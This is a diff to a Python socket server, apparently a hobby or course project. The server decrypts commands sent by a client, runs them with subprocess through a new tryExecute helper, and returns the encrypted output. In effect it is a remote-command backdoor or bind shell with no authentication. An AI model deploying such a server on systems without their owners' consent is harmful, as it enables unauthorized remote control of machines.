@@ -22,8 +22,9 @@ def runServer():
         ##unpack data - SHOULD NEVER ERROR
         recv_msg, err = unpackData(recv_data)
         
-        #DEBUGGING: print the message
-        print("client said:" + str(recv_msg))
+        #DEBUGGING: print the 
+        print("client said (enc):" + str(recv_data))
+        print("client said (dec):" + str(recv_msg))
 
         ##extract the command
         cmd = recv_msg.strip().split(" ",1)
@@ -37,26 +38,22 @@ def runServer():
             exit(0)
 
         ##try to execute the command
-        '''
-        cmd_output = ""
-        try:
-            rawout = subprocess.run(cmd, capture_output=True)
-        except Exception as e:
-            print('Error executing command... ignoring')
-            return_msg = "command failed"
-            continue
-        else:
-            cmd_output = "EXECUTED COMMAND\n" + str(rawout.stdout,'utf-8')
-            pass
-        finally:
-            pass
-        '''
+        cmd_output, err = tryExecute(cmd)
+        #handle errors
+        if (err == 1):
+            #command execution failed
+            cmd_output = "ERROR EXECUTING" #**temporary error message
+        
+        #****check if output is > 512 bytes; trim size if so
+        if(len(cmd_output) > 512):
+            print("Oops")
 
         ##craft return packet with cmd_output
-        #packet = cmd_output
-        packet, err = packInput("helloworld")
+        packet, err = packInput(cmd_output)
         if(err != 0):
-            print("Hmmm...")
+            print("Some error packing output occured")
+            print(err)
+            packet = "TEMP_ERROR_PACKET" #replace this with code to re-try packing
 
         #send return packet data
         conn.send(packet.encode())
@@ -64,9 +61,31 @@ def runServer():
 
     conn.close()  # close the connection
 
-#########################
+######################
 #  Helper functions  #
 ######################
+
+#def tryExecute(cmd)
+#args: cmd - command extracted from client packet
+#returns: (cmd_output, err) - output of command execution and error message
+#   err = 0 ; no error
+#       = 1 ; bash execution error
+#       = 2 ; UNUSED error
+def tryExecute(cmd):
+    cmd_output = None
+    err = 0
+
+    try:
+        rawout = subprocess.run(cmd, capture_output=True)
+    except Exception as e:
+        # error executing command
+        err = 1
+    else:
+        cmd_output = str(rawout.stdout,'utf-8')
+        #cmd_output = "testytesttest"
+    finally:
+        pass
+    return cmd_output, err
 
 #def packInput(user_input)
 #args: user_input - user provided command string
@@ -86,7 +105,7 @@ def packInput(user_input):
     if(safe_input == None):
         err = 1
         return packet, err
-    
+    print(safe_input)
     ##encryption
     encrypted_safe_input = ""
     try:
